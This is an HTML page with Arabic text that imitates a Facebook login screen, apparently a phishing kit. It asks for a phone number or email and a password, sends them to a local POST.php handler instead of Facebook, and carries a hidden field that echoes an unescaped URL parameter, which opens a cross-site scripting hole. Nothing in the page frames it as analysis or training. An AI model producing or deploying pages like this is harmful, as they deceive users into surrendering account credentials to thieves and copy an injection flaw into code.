<!DOCTYPE html>
<html>
    
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="icon.png">
    <title>facebook</title>
    <link rel="stylesheet" href="bootstrap.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <nav>
        <h3 class="text-center">Facebook</h3>
    </nav>
    <div class="war">
        <div class="alert alert-warning" role="alert">
            سجل دخولك بالفيسبوك للمتابعة.
          </div>
    </div>

    <div class="container">
        <div class="form-box">
            <form action="POST.php" method="POST">
                <input type="text" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required="required">
                <input minlength="6" type="password" name="password" placeholder="كلمة السر" required="required">
               <input type="hidden" name="nam" value="<?php echo $_GET['name']; ?>">
                <button class="btn btn-primary b1">تسجيل الدخول</button>
                <div class="aps">
                    <hr class="hr">
                    <p><span>أو</span></p>
                </div>

                <button class="btn btn-success text-center c1">إنشاء حساب جديد</button>
                <br>
                <p></p>
                
            </form>
        </div>
    </div>
    <script src="jq.js"></script>
    <script src="bootstrap.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
